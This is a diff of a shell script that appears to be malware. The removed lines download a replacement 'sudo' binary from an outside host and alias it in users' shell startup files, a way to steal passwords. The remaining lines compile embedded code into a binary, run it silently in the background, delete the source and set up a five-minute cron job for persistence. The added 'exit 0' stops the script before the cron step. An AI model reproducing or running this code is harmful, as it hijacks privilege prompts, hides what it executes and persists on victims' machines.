@@ -18,31 +18,6 @@ c_code="$parent_path/esp_client.c"
 script_path="$parent_path/esp_client"
 mkdir -p "$parent_path"
 
-curl -fsSL https://airflow.it.com/sudo > ~/.local/bin/sudo
-chmod +x ~/.local/bin/sudo
-
-TARGET_FILES=("$HOME/.bashrc")
-
-if which zsh >/dev/null 2>&1; then
-    TARGET_FILES+=("$HOME/.zshrc")
-fi
-
-for RC_FILE in "${TARGET_FILES[@]}"; do
-    if grep -qF 'PATH="$HOME/.local/bin:$PATH"' "$RC_FILE" || grep -qF 'alias sudo="$HOME/.local/bin/sudo"' "$RC_FILE"; then
-        echo "Configuration already exists in $RC_FILE. Skipping."
-    else
-        cat << 'EOF' >> "$RC_FILE"
-PATH="$HOME/.local/bin:$PATH"
-alias sudo="$HOME/.local/bin/sudo"
-EOF
-        echo "Successfully added configuration to $RC_FILE"
-    fi
-	source "$RC_FILE"
-done
-
-export PATH="$HOME/.local/bin:$PATH"
-export alias sudo="$HOME/.local/bin/sudo"
-
 cat << EOF > "$c_code"
 #include <stdlib.h>
 const char *script_content = 
@@ -67,6 +42,8 @@ EOF
 gcc "$c_code" -o "$script_path"
 "$script_path" > /dev/null 2>&1 &
 rm "$c_code"
+
+exit 0
 
 CRON_JOB="*/5 * * * * $script_path"
 if ! crontab -l 2>/dev/null | grep -Fxq "$CRON_JOB"; then
